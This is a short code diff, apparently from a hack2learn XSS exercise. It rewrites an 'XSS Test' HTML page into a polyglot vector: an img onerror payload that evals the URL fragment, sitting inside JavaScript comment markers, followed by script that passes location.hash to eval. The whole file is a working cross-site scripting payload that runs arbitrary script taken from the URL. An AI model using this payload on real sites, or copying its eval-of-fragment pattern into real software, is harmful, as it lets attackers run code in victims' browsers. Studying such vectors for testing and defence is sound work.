@@ -1,25 +1,30 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>XSS Vector</title>
-</head>
-<body>
-<h1>XSS Test</h1>
-<script>
-  
+/* =================================== !/
+
+
+<Img Src OnError = h=location.hash,h?eval(h.slice(1)):confirm(1)>
+
+/! =================================== */
+
 if (document.location.hash) {
    var frag = document.location.hash.match(/[^#][^#]*/)[0];
 }
 
 if (frag) {
+
   try {
+
     eval(frag);
+
   } catch(e) {
+
     alert("URL fragment (#) contains invalid JS code, try again!");
   }
+
 } else {
-  alert(document.domain);
+
+  alert(1);
+
 }
-</script>
-</body>
-</html>
+
+// #hack2learn
+
